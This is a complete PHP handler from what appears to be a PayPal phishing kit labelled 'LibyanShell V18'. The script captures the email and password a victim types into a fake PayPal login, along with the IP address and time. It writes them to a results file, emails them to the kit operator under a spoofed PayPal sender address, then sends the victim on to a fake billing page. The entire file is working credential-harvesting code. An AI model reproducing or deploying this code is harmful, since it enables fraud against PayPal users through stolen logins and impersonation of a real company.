<?php
session_start();
if(isset($_POST['email'])){

if(!empty($_POST['pass'])){

$HF_V = $_SESSION['country_name'];

$email    = $_POST['email'];

$pass    =  $_POST['pass'];

$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$wiz = "^_^ ";
$rand = md5(microtime());



$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " PayPal LoGin -  [ " .$ip. " - " .$wiz. " ] ";
$headers = "From: ^__Rzlt__^ <paypal@support.com>" . "\r\n";

$message = "


################### LibyanShell V18 ############################

E-MAIL          =>   ".$email."
PASSWORD        =>   ".$pass."
IP              =>  "."http://www.geoiptool.com/?IP=".$ip."
TIME            =>   ".$time."


################### LibyanShell V18 ############################

";

$txt = fopen('../../rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);
include '../antibots.php';
include './email.php';
include '../block.php';
mail($yourmail, $subject, $message , $headers);

header("location:../billing.php?websrc=".md5('X-moustache')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");


 	}else{header("Location: ../login44.php");}

}else{header("Location: ../login44.php");}